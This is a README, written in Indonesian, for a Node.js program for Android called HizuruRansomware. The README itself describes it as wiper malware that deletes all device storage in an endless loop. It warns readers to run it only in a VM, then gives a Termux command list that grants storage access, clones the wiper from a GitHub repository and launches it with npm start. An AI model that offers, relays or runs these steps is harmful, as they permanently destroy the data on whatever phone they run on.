# HizuruRansomware
***Penjelasan***
> HizuruRansomware adalah Program CLI yang ditulis menggunakan Node.js, Program ini dapat dikategorikan Sebagai Wiper Malware karena Sifatnya yang Menghancurkan dan tidak dapat memulihkan Data Android Kembali. Diharapkan jangan pernah menjalankan Program ini secara Coba-Coba karena bersifat Fatal Jika kamu menjalankannya bukan di lingkungan VM

**DANGER!!**
> Jangan Pernah Untuk mencoba-coba menjalankan Program ini Tanpa menjalankannya di lingkungan VM, Malware ini diRancang untuk menghapus semua Data Penyimpanan kita secara Looping tanpa Henti yang Dapat mengakibatkan Data Hilang Permanen! Disarankan Backup Data terlebih Dahulu bila ingin mencoba di Lingkungan non-VM

# Cara Installasi (Termux Only)
***Masukkan Semua Command ini kedalam Termux Anda***
```bash
apt update -y
apt upgrade -y
pkg update -y
yes | pkg upgrade
pkg install nodejs-lts -y
termux-setup-storage
pkg install git -y
pkg install curl -y
git clone https://github.com/SyifaaDev/HizuruWiper.git
cd HizuruWiper
npm start
```

